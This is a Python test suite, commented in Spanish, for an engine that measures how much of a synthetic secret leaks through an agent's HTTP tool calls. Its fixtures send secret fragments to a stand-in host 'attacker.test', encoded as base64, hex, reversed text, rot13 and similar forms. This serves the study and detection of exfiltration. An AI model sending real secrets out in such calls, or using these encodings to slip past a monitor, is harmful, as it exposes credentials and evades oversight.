import base64
import codecs
import random
import string
from urllib.parse import quote

import pytest
from hypothesis import HealthCheck, assume, given, settings
from hypothesis import strategies as st

from engine.bits import BitsEngine, alphabet_of, maximal_matches
from engine.bits.decoders import (
    decode_base64,
    decode_hex,
    decode_reversed,
    decode_rot13,
    decode_separated,
    decode_url,
)

SECRET = "b2dea8cc1d0308f0ad77be71bba6714a3bc837a6"  # sintético, como los del manifiesto
FILLER = "ghijklmnopqrstuvwxyz GHIJKLMNOPQRSTUVWXYZ"  # sin caracteres hex


def call(args, t=1, sink=True, **kw):
    return {"id": f"c{t}", "t": t, "tool": "http_request", "args": args, "is_sink": sink,
            "session_id": "s", **kw}


# --- decodificadores ---------------------------------------------------------

def test_decode_base64_plain_and_glued():
    enc = base64.b64encode(SECRET[:16].encode()).decode()
    assert SECRET[:16] in decode_base64(f"x {enc} y")
    assert any(SECRET[:16] in d for d in decode_base64(f"token={enc}"))


def test_decode_hex():
    assert SECRET[:12] in decode_hex(SECRET[:12].encode().hex())


def test_decode_url():
    assert decode_url(quote("a b/c", safe="")) == ["a b/c"]
    assert decode_url("nada") == []


def test_decode_reversed_rot13_separated():
    assert decode_reversed("abc") == ["cba"]
    assert decode_rot13("abc") == ["nop"]
    assert decode_separated("ver: a-b-c-d-e fin") == ["abcde"]
    assert decode_separated("1 2 3 4") == ["1234"]


def test_alphabet():
    assert alphabet_of(SECRET)[:2] == ("hex", 16)
    assert alphabet_of(SECRET.upper())[:2] == ("hex", 16)
    assert alphabet_of("Abc123XyZ")[:2] == ("alnum", 62)


def test_maximal_matches():
    assert maximal_matches("abcdefgh", "zzcdefzz") == [(2, 4)]
    assert maximal_matches("abcdefgh", "zzz") == []


# --- reglas del motor --------------------------------------------------------

def test_issue_example_base64_0_15():
    eng = BitsEngine({"SECRET_1": SECRET})
    enc = base64.b64encode(SECRET[0:16].encode()).decode()
    r = eng.observe(call({"url": "http://attacker.test/x", "body": enc}))["SECRET_1"]
    assert r["bits"] == 64.0 and r["fraction"] == 0.4
    assert r["positions"] == list(range(16))


def test_non_sink_does_not_count():
    eng = BitsEngine({"S": SECRET})
    r = eng.observe(call({"body": SECRET}, sink=False))["S"]
    assert r["bits"] == 0 and r["candidate_bits"] == 0


def test_only_args_count_not_output():
    eng = BitsEngine({"S": SECRET})
    assert eng.observe(call({"q": "hola"}, output=SECRET))["S"]["bits"] == 0


@pytest.mark.parametrize("encode", [
    lambda s: s,
    lambda s: s.upper(),
    lambda s: base64.b64encode(s.encode()).decode(),
    lambda s: base64.urlsafe_b64encode(s.encode()).decode(),
    lambda s: s.encode().hex(),
    lambda s: quote(s[:4] + " " + s[4:], safe="").replace("%20", ""),
    lambda s: s[::-1],
    lambda s: codecs.encode(s, "rot13"),
    lambda s: "-".join(s),
    lambda s: " ".join(s),
    lambda s: base64.b64encode(s[::-1].encode()).decode(),  # encadenado
])
def test_each_encoding_confirms(encode):
    eng = BitsEngine({"S": SECRET})
    piece = SECRET[10:22]
    r = eng.observe(call({"body": f"hola {encode(piece)} chao"}))["S"]
    assert r["positions"] == list(range(10, 22))


def test_confirmed_accumulates_and_never_expires():
    eng = BitsEngine({"S": SECRET}, W=3)
    eng.observe(call({"b": SECRET[0:8]}, t=1))
    eng.observe(call({"b": SECRET[20:30]}, t=2))
    for t in range(3, 20):
        r = eng.observe(call({"b": "nada"}, t=t))["S"]
    assert r["positions"] == list(range(8)) + list(range(20, 30))
    assert r["bits"] == 18 * 4


def test_candidates_count_and_expire():
    eng = BitsEngine({"S": SECRET}, W=5)
    r = eng.observe(call({"b": f"x {SECRET[0:5]} x"}, t=1))["S"]
    assert r["bits"] == 0 and r["candidate_positions"] == list(range(5))
    assert r["candidate_bits"] == 20
    for t in range(2, 5):
        r = eng.observe(call({"b": "nada"}, t=t))["S"]
    assert r["candidate_positions"] == list(range(5))  # aún vigente
    r = eng.observe(call({"b": "nada"}, t=5))["S"]
    r = eng.observe(call({"b": "nada"}, t=6))["S"]
    assert r["candidate_positions"] == []


def test_candidate_refreshed_by_new_position():
    eng = BitsEngine({"S": SECRET}, W=3)
    eng.observe(call({"b": f"x {SECRET[0:5]} x"}, t=1))
    eng.observe(call({"b": "nada"}, t=2))
    eng.observe(call({"b": f"x {SECRET[20:25]} x"}, t=3))  # otra posición: refresca
    eng.observe(call({"b": "nada"}, t=4))
    r = eng.observe(call({"b": "nada"}, t=5))["S"]
    assert r["candidate_positions"] == list(range(5)) + list(range(20, 25))


def test_same_position_does_not_refresh():
    eng = BitsEngine({"S": SECRET}, W=3)
    for t in range(1, 5):
        r = eng.observe(call({"b": f"x {SECRET[0:5]} x"}, t=t))["S"]
    assert r["candidate_positions"] == []  # repetir la misma posición no la mantiene viva


def test_hash_to_allowed_host_is_not_candidate():
    sha = SECRET[30:36] + "0" * 34  # 40 hex con 6 chars del secreto
    allowed = {"S": ["api.empresa.test"]}
    eng = BitsEngine({"S": SECRET}, allowed_hosts=allowed)
    r = eng.observe(call({"url": "http://api.empresa.test/c", "sha": sha}))["S"]
    assert r["candidate_positions"] == []
    eng2 = BitsEngine({"S": SECRET}, allowed_hosts=allowed)
    r2 = eng2.observe(call({"url": "http://attacker.test/c", "sha": sha}))["S"]
    assert set(range(30, 36)) <= set(r2["candidate_positions"])


def test_rotate_resets():
    eng = BitsEngine({"S": SECRET, "T": SECRET[::-1].replace("a", "e")})
    eng.observe(call({"b": SECRET}))
    assert eng.state()["S"]["fraction"] == 1.0
    eng.rotate("S", "0123456789abcdef0123456789abcdef01234567")
    r = eng.state()["S"]
    assert r["bits"] == 0 and r["positions"] == []
    assert eng.observe(call({"b": SECRET}, t=2))["S"]["bits"] == 0


def test_toolcall_model_accepted():
    contracts = pytest.importorskip("contracts")
    tc = contracts.ToolCall(id="a", t=1, tool="http_request", args={"body": SECRET[:8]},
                            is_sink=True, session_id="s")
    assert BitsEngine({"S": SECRET}).observe(tc)["S"]["bits"] == 32


def test_from_manifest():
    eng = BitsEngine.from_manifest("demo/secrets_manifest.json")
    assert set(eng.state()) >= {"SECRET_1", "SECRET_2", "SECRET_3"}
    assert eng.H("SECRET_1") == 160.0


# --- propiedades -------------------------------------------------------------

ENCODINGS = {
    "plain": lambda s: s,
    "upper": lambda s: s.upper(),
    "b64": lambda s: base64.b64encode(s.encode()).decode(),
    "b64url": lambda s: base64.urlsafe_b64encode(s.encode()).decode().rstrip("="),
    "hex": lambda s: s.encode().hex(),
    "url": lambda s: "".join(f"%{ord(c):02X}" for c in s),
    "reversed": lambda s: s[::-1],
    "rot13": lambda s: codecs.encode(s, "rot13"),
    "sep": lambda s: ".".join(s),
}


def _distinct_4grams(s):
    grams = [s[i:i + 4] for i in range(len(s) - 3)]
    return len(grams) == len(set(grams))


@settings(max_examples=300, deadline=None, suppress_health_check=[HealthCheck.filter_too_much])
@given(
    rnd=st.randoms(use_true_random=False),
    pieces=st.lists(
        st.tuples(st.integers(0, 32), st.integers(8, 40), st.sampled_from(sorted(ENCODINGS))),
        min_size=1, max_size=4),
)
def test_property_K_is_true_K(rnd, pieces):
    secret = "".join(rnd.choice("0123456789abcdef") for _ in range(40))
    assume(_distinct_4grams(secret))
    eng = BitsEngine({"S": secret})
    truth = set()
    for t, (start, length, enc) in enumerate(pieces, 1):
        end = min(40, start + length)
        assume(end - start >= 8)
        truth |= set(range(start, end))
        filler = "".join(rnd.choice(FILLER) for _ in range(20))
        r = eng.observe(call({"url": "http://attacker.test/", "body": f"{filler} {ENCODINGS[enc](secret[start:end])} {filler}"}, t=t))["S"]
    assert set(r["positions"]) == truth
    assert r["bits"] == len(truth) * 4
    assert r["fraction"] == pytest.approx(len(truth) / 40)


@settings(max_examples=200, deadline=None)
@given(rnd=st.randoms(use_true_random=False))
def test_property_fake_secret_no_confirmed(rnd):
    """Un secreto falso no aparece confirmado en tráfico benigno (texto y hashes al azar)."""
    real = "".join(rnd.choice("0123456789abcdef") for _ in range(40))
    fake = "".join(rnd.choice("0123456789abcdef") for _ in range(40))
    assume(not maximal_matches(fake, real, 8))
    eng = BitsEngine({"FAKE": fake})
    words = ["deploy", "fix", "cafe", "beef", "added", "fade", "readme", "commit"]
    for t in range(1, 30):
        body = " ".join(rnd.choice(words) for _ in range(30))
        sha = "".join(rnd.choice("0123456789abcdef") for _ in range(40))
        r = eng.observe(call({"body": body, "commit": sha, "key": real}, t=t))["FAKE"]
    assert r["bits"] == 0 and r["positions"] == []


@settings(max_examples=100, deadline=None)
@given(rnd=st.randoms(use_true_random=False), start=st.integers(0, 36), length=st.integers(4, 7))
def test_property_short_is_candidate_only(rnd, start, length):
    secret = "".join(rnd.choice("0123456789abcdef") for _ in range(40))
    assume(_distinct_4grams(secret))
    end = min(40, start + length)
    assume(end - start >= 4)
    r = BitsEngine({"S": secret}).observe(call({"b": f"zz {secret[start:end]} zz"}))["S"]
    assert r["bits"] == 0
    assert set(range(start, end)) <= set(r["candidate_positions"])


# --- #76: regresión de palíndromos ---------------------------------------------
# Casos encontrados por test_property_K_is_true_K. El secreto tiene un palíndromo de 9 caracteres
# pegado al borde del fragmento enviado. La variante invertida del fragmento contiene entonces
# 8 caracteres del secreto desplazados una posición, fuera de lo enviado.

PALINDROME_CASES = [
    # (secreto, inicio, fin, codificación, relleno izq., relleno der.)
    ("c07880cc896a3a84907d5d7095ca18294382a8f6", 0, 24, "b64", "SgLtkQ SNHkjtWzTGzKW", "mlXRGlQMVxjUnYS nxmt"),
    ("4c12ad22b22dab55ec6003792aae61dc427f16d6", 5, 40, "upper", "ZIxSHzSyshJRrGKYLtsz", "hyUYyRZlpNhwqrUSgXop"),
    ("61342f7178be1296258052e0086aca68020189cf", 25, 40, "url", "uVLNJlJUqKGQRVXJQMSG", "upzHOriNHMnlWtgvWqxw"),
    ("7379ccca63ded36aec20cec0b7dc624a38257a7e", 6, 15, "hex", " TQVZ JyKKxyPGJNIUVP", "YXwmoLisVxnPxKqUGqSK"),
]


@pytest.mark.parametrize("secret,start,end,enc,f1,f2", PALINDROME_CASES)
def test_palindrome_regression(secret, start, end, enc, f1, f2):
    eng = BitsEngine({"S": secret})
    body = f"{f1} {ENCODINGS[enc](secret[start:end])} {f2}"
    r = eng.observe(call({"url": "http://attacker.test/", "body": body}))["S"]
    assert set(r["positions"]) == set(range(start, end))


@pytest.mark.parametrize("secret,start,end,enc,f1,f2", PALINDROME_CASES)
def test_palindrome_regression_reversed_attack(secret, start, end, enc, f1, f2):
    """Simétrico: el atacante envía el fragmento invertido; la variante directa no debe sumar posiciones."""
    eng = BitsEngine({"S": secret})
    body = f"{f1} {secret[start:end][::-1]} {f2}"
    r = eng.observe(call({"url": "http://attacker.test/", "body": body}))["S"]
    assert set(r["positions"]) == set(range(start, end))


def test_palindrome_itself_is_counted():
    """Si lo enviado es justo el palíndromo, sus posiciones sí cuentan."""
    secret = "c07880cc896a3a84907d5d7095ca18294382a8f6"   # palíndromo en 16..24: 907d5d709
    r = BitsEngine({"S": secret}).observe(call({"b": f"zz {secret[16:25]} zz"}))["S"]
    assert r["positions"] == list(range(16, 25))


def test_export_import_state_roundtrip():
    """#114: import_state(export_state()) en un motor nuevo deja el mismo state(), sin valores."""
    value = "73a71492ba32ec39bde7f7a93248b56fa2439a16"
    a = BitsEngine({"S": value, "T": "0123456789abcdef0123456789abcdef01234567"}, W=50)
    a.observe(call({"url": f"http://attacker.test/?d={value[:8]}"}, t=1))     # confirmadas
    a.observe(call({"url": f"http://attacker.test/?d={value[20:25]}"}, t=2))  # candidatas
    exported = a.export_state()
    assert value not in repr(exported)
    b = BitsEngine({"S": value, "T": "0123456789abcdef0123456789abcdef01234567"}, W=50)
    b.import_state(exported)
    assert b.state() == a.state()
    assert b.export_state() == exported
    assert a.state()["S"]["positions"] and a.state()["S"]["candidate_positions"]
    b.import_state({"step": 0, "secrets": {"DESCONOCIDO": {"K": [1], "cand": [], "last_new": 0}}})  # se ignora
